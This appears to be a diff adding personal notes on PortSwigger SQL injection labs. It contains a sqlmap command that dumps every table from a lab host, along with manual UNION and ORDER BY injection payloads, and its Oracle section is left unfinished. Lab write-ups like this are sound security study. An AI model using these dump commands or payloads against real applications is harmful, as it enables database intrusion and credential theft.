@@ -390,6 +390,44 @@ Try to adapt this Payload:
 2. `/filter?category='UNION+SELECT+@@version,NULL+--+`
 
 
+## SQL injection attack, listing the database contents on non-Oracle databases
+
+> This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+> The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+> To solve the lab, log in as the administrator user.
+
+### Approaches
+* I remember I saw something in [Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet) about listing Content
+* ... besides I can query page with sqlmap
+
+### Solution
+
+`sqlmap --tables --dump-all --batch -u https://ac021f111ea96192c01c0d2f00b200a8.web-security-academy.net/filter?category=Gifts`
+
+![](assets/16524391418060.png)
+
+## SQL injection attack, listing the database contents on Oracle
+
+> This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+>
+> The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+>
+>To solve the lab, log in as the administrator user.
+
+### Approaches
+* Try at first sqlmap approach…
+* Try hint from [Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
+
+
+### Solution A: with sqlmap
+
+
+
+### Solution B: "Manually"
+1. `/filter?category='+ORDER+BY+2--`
+2. 
+
+
 # Server-side request forgery (SSRF)
 
 # Authentication
